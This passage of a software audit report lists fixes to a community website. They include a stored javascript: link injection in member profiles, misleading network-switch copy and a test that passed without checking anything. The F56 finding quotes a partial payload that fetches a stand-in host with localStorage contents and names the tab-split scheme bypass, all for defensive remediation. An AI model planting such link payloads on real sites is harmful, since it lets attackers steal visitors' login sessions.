## 0. Executive summary

Yesterday's pass cleaned the *older* surfaces. This one read the code that shipped **after**
it — Phase A profiles, Phase C forum, and the Stage 2 design sweep — and found the two things
that class of change produces: a security boundary that was only enforced in a form, and
copy that no longer matches the thing it describes.

- **A stored script-URL injection in member profiles (F56).** A published profile link is
  rendered as an `href` on `/members`. React 18 warns about `javascript:` URLs and does not
  block them, and RLS lets a member write their own `profiles` row straight through
  PostgREST. The scheme check lived only in the form, so one member could have had any
  visitor's click execute in the `pirateusa.org` origin — where the Supabase session is
  persisted. The check now exists on read, on write, and in the database.
- **The forum's "New thread" button was a dead control** for a signed-in Passport with no
  muster record (F57), and the copy said "seven boards" in three places for a forum that
  ships eight.
- **`/propose` and `/shop` still promised a "SECURE CHANNEL"** for a network switch (F59) —
  the copy half of the defect the previous pass fixed on the button.
- **Gateway 3 could go green without opening the panel it asserted on (F60).** This one
  matters beyond the page it tests: CI reported 45/45 on a run where the `/policies` notes
  assertion was satisfied before React had rendered anything to assert about. A negated text
  match passes on absence, and absence is the initial state.

**Nothing about the platform's blocking problems changed**: production is now current with
`main` (deployed after PR #129), `policy_consensus` is still drifted 14/14, the profiles and
forum migrations are still unapplied, and every operational table still holds zero rows.
Re-verified today, not assumed.

## 2. Fixed in this pass

| # | Sev | Finding | Fix |
|---|---|---|---|
| F56 | **S2** | **Stored `javascript:` injection through profile links.** `Directory.jsx` and `Profile.jsx` render `href={link.url}` from a member-supplied JSONB array. `normalizeLinks()` filtered empty strings only; the scheme check lived in `validateProfile()`, which runs in the browser and is not the only writer — `profiles` RLS lets the member INSERT/UPDATE their own row over PostgREST with the public anon key and their session. React 18.3's `sanitizeURL` **warns** (`A future version of React will block javascript: URLs`) and renders the URL anyway; verified in `node_modules/react-dom/cjs/react-dom.development.js:651`. A member could therefore store `javascript:fetch('//x/'+localStorage…` as a "Website" link and have it run in the `pirateusa.org` origin on any visitor's click, where `persistSession: true` holds their Supabase JWT. Signup is open, so "a member" means "anyone with an email address". | New dependency-free `src/lib/api/links.js`: `safeLinkUrl()` accepts only complete `http(s)` URLs, rejects C0 control characters (the `java\tscript:` class), and proves the protocol with `new URL()`. `normalizeLinks()` drops everything else on **read** (both `mapProfile` and `fetchPublicDirectory`) and on **write**. `validateProfile()` now validates what was *supplied* so a rejected scheme is an error the member sees rather than a link that vanishes. Migration `20261106130000_profile_link_scheme.sql` adds the same rule as a CHECK constraint over an IMMUTABLE helper, so a direct PostgREST write is refused as well. 11 unit cases cover the hostile forms. |
| F57 | S3 | **The forum contradicted itself and had a dead control.** (a) `Forum.jsx` said "Seven boards, one Federation", `ForumCategory` said "the seven boards are listed on the forum index", and `categories.js` said "the same seven rows are seeded" — while `FORUM_CATEGORIES` has eight and the migration seeds eight. (b) "New thread" renders whenever a Passport is signed in, but the composer is gated on `member` — a Passport with no `members` row clicked the button and got no form, no message and no reason. That is the F37/F51 family: a control that accepts a click and does nothing, with the explanation withheld. | Count derived from `FORUM_CATEGORIES.length` in the two pages, and the header comment corrected. The composer now renders an explicit panel — "A muster record is required to post" — with the muster form and the Passport dialog as the two routes out. |
| F58 | S3 | **The sitemap had drifted from the routes.** `public/sitemap.xml` carries its own instruction ("the SPA routes in src/App.jsx are the set that exists … update both together"), and `/forum`, `/members` and all eight board routes were missing. Eight new public pages, zero discoverable. Nothing enforced the instruction. | Added the ten URLs (deliberately excluding `/profile`, which is the signed-in member's own record). `tests/unit/sitemap.test.mjs` enforces both directions: every sitemap URL must be a route the app serves, and every public static route must be in the sitemap unless listed as not-for-indexing with a reason. |
| F59 | S3 | **`/propose` and `/shop` still claimed a "SECURE CHANNEL".** With a wallet on the wrong chain, both pages returned a full-page gate headed `[ SECURE CHANNEL: ARBITRUM NETWORK CONNECTION REQUIRED ]` and a document title of "Secure Channel". Selecting a chain establishes no channel and no transport security. The 2026-11-03 pass fixed the dead button behind that banner (`SwitchNetworkButton`) and the Armory copy; the Propose copy and both titles were left behind. | Both gates now read "Switch to Arbitrum" with one sentence about why the network matters; both titles say "Network Required". `SECURE CHANNEL` no longer appears in any rendered string. |
| F60 | S3 | **Gateway 3 could pass without opening the panel it asserted on.** The `/policies` notes test clicked `Notes (0)` and immediately asserted `not.toContainText(/peer review/i)`. A negated text match is satisfied by *absence*, and absence is the state before React commits the click's re-render — so on a fast runner the assertion passed instantly. CI's 2026-11-06 run reports that test green in 1.5 s while the string `they are not peer review and the Federation never receives them` is present in the shipped `Policies` chunk; the same test fails deterministically in this sandbox. A green check that inspected nothing is worse than a red one. | The test now waits for the panel (`No notes on this device`, `saved in this browser only`) before asserting anything, and forbids only the invitation forms (`Add peer review`, `peer review recorded`) — the copy that legitimately *denies* peer review no longer counts as a violation. |
| F61 | S4 | **Stray brand literal.** `SEO.jsx` set `theme-color` to `#9400FF` (and the intelligence schematic used the same value for its strokes) — not the APF purple token `#9400D3` used everywhere else, including `tailwind.config.js`. | Both to `#9400D3`. The wider token drift (F11: `#07080B`/`#10B981` vs the SOP's `#050505`/`#00FF66`) is still a brand-owner decision and was not touched. |

No production behaviour was added: every change removes or corrects an assertion, or narrows
